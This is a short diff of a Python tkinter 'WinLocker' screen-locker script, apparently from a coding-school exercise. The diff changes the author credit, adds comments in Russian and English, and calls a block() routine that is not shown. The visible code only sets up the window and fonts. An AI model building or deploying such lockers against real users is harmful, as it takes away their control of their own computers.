@@ -1,4 +1,3 @@
-
 import tkinter
 from tkinter import *
 import tkinter as tk
@@ -10,12 +9,13 @@ import os.path
 import pyautogui
 from time import sleep
 
+# Создание окна. Присваиваем переменной имя нашего пользователя  (user)
 USER_NAME = getpass.getuser()
 
-window = Tk()
-window.title("WinLocker by Coddy_School")
-window.geometry('400x250')
-window['bg'] = 'black'
+window = Tk()  # Приравниваем переменной имя нашего пользователя (user)
+window.title("WinLocker by Nickyfwd") # Заголовок окна
+window.geometry('400x250')# Размер окна ( он вряд ли пригодится но на всякий)
+window['bg'] = 'black'# цвет фона
 
 # Base size
 normal_width = 1920
@@ -24,6 +24,8 @@ normal_height = 1080
 
 screen_width = window.winfo_screenwidth()
 screen_height = window.winfo_screenheight()
+
+# Get percentage of screen size from Base size
 
 percentage_width = screen_width / (normal_width / 100)
 percentage_height = screen_height / (normal_height / 100)
@@ -40,6 +42,7 @@ minimum_size = 40
 if fontsizeHding < minimum_size:
        fontsizeHding = minimum_size
 
+# Create a style and configure for ttk.Button widget
 default_style = ttk.Style()
 default_style.configure('New.TButton', font=("Helvetica", fontsize))
 
@@ -81,5 +84,6 @@ btn.place(relx = .62, rely = .5, relwidth=.1, relheight=.06)
 
 block()
 
-window.mainloop()
 
+
+window.mainloop()
